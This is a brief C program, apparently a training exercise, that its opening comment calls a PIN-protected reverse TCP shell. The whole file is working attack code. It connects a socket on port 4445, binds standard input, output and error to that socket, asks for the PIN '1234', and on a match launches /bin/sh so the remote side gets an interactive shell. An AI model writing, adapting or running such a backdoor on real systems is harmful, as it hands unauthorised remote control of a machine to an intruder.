//reverse TCP shell which establishes a connection back on port 4445, if the PIN code 1234 is submitted. 

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>

int main()
{
	int sockfd;
	char buf[4];
	int result;

	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(4445);
	bzero(&server.sin_zero, 8);

	char *const argv[] = {"/bin/sh", NULL};
	char *const envp[] = {NULL};

	//create a socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	//initiate a connection on a socket, on success 0 is returned
	connect(sockfd, (struct sockaddr *)&server, sizeof(server));
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	write(sockfd, "PIN:", 4);
	read(sockfd, &buf, 4);

	result = strncmp("1234", buf, 4);
	if(result == 0)
	{
		execve("/bin/sh", argv, envp);
	}
	return 0;

}
